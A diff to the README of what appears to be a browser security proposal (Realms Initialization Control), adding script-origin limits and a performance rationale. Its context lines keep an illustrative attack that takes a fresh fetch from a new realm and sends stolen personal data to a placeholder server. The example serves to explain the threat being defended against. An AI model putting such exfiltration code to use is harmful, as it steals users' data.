@@ -38,6 +38,7 @@ document.body.appendChild(iframe);
 * [Goals](#Goals)
 * [Proposal](#Proposal)
 * [Example](#Example)
+* [Security](#Security)
 * [Use Cases](#Use-Cases)
     * [Safe Composability](#safe-composability-sandboxing--confinement)
     * [Application Monitoring](#application-monitoring-security--errors--performance--ux)
@@ -46,7 +47,7 @@ document.body.appendChild(iframe);
     * [Improved Composability](#Improved-Composability)
 * [Considerations](#Considerations)
    * [Privacy](#Privacy)
-   * [Security](#Security)
+   * [Security](#Security-1)
    * [Feasibility](#Feasibility)
    * [Canonicality](#Canonicality)
    * [CSP Integration](#CSP-Integration)
@@ -56,11 +57,11 @@ document.body.appendChild(iframe);
    * [Headers](#headers)
    * [CSP](#CSP)
    * [ShadowRealms](#ShadowRealms)
-   * [Sandboxed / Cross Origin iframes](#Sandboxed--Cross-Origin-iframes)
+   * [Sandboxed / Cross Origin iframes and Workers](#Sandboxed--Cross-Origin-iframes-and-workers)
    * [Document Policy](#Document-Policy)
+   * [Permissions Policy](#Permissions-Policy)
 * [Self-Review Questionnaire: Security and Privacy](#self-review-questionnaire-security-and-privacy)
 * [Terminology](#Terminology)
-* [Support](#Support)
 * [Resources](#Resources)
 
 ## Abstract
@@ -188,7 +189,12 @@ Initialization of same origin realms in an application should be under that appl
 
 This proposal describes an opt-in capability to set a script to be loaded first, everytime a same origin realm with synchronous access to the main execution environment of the application is created.
 
-The location of the script can be relative or absolute. Secure connection is required.
+For it to be safe to use, some crucial properties/limitations must apply:
+
+* The location of the script can be relative or absolute, but must resolve to the same origin as the web app.
+* Secure connection is required.
+* The resource provided must explicitly state its ContentType as of JavaScript.
+
 The proposed method for setting the script is a Content Security Policy directive as follows:
 
 ```
@@ -242,6 +248,10 @@ const newFetchInstance = stealFetch()
 const payload = stealPII()
 newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
 ```
+
+## Security
+
+TODO
 
 ## Use Cases
 
@@ -311,7 +321,7 @@ Allowing such untrusted code to run in the origin of the app can allow it for ex
 
 ## Considerations
 
-This section focuses on important details that were brought into consideration, as well as conclusions on how to address them.
+This section focuses on details that were brought into consideration, as well as conclusions on how to address them.
 
 While important for achieving design that's both good and acceptable by stake holders, these considerations are also expected to be later on refered to and integrated into relevant specs and browsers' implementations (Security and Privacy especially).
 
@@ -394,7 +404,16 @@ And will execute the scripts in that order.
 
 ### Performance
 
-TODO
+Naturally, the RIC proposal will introduce a performance impact, but that is somewhat by design if you want to control the creation phase of same origin realms within your app (to which you are not obligated to opt-in to).
+
+The current alternative is that web apps that wish to address this issue integrate [snow](https://github.com/lavamoat/snow)-like solutions that solve this problem using JS, which is necessarily inferior to a built-in solution such as the proposed RIC.
+
+Those who need this will see a perf improvement, migrating from a user-land solution to a native-based one.
+Those who find this to not be worth it these days, will either continue to think so or perhaps change their minds given how RIC will be faster than current user-land alternatives.
+
+This is a security feature, in which running first is crucial, thus the introduction of a perf-impact to this (opt-in) feature is pretty natural - there's no other way to do this really.
+
+To mitigate the necessary performance hit, implementers are expected to fetch the RIC resource when is introduced at the headers parsing stage in parallel to other stages, but only until reaching the DOM parsing stage which must be delayed until the RIC resource is both fetched and loaded (executed) to completion.
 
 ## Insufficient Alternatives
 
@@ -420,11 +439,15 @@ The only directives that revolve around realms security issues are `iframe` rela
 
 TODO
 
-### Sandboxed / Cross Origin iframes
+### Sandboxed / Cross Origin iframes and Workers
 
 TODO
 
 ### Document Policy
+
+TODO
+
+### Permissions Policy
 
 TODO
 
@@ -537,10 +560,6 @@ In the browser ecosystem, [realms](#Realm) are associated with an origin. For ex
 ### Cross Origin Realm
 
 The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross-origin realm to realm B, and vice versa.
-
-## Support
-
-TODO
 
 ## Resources
 
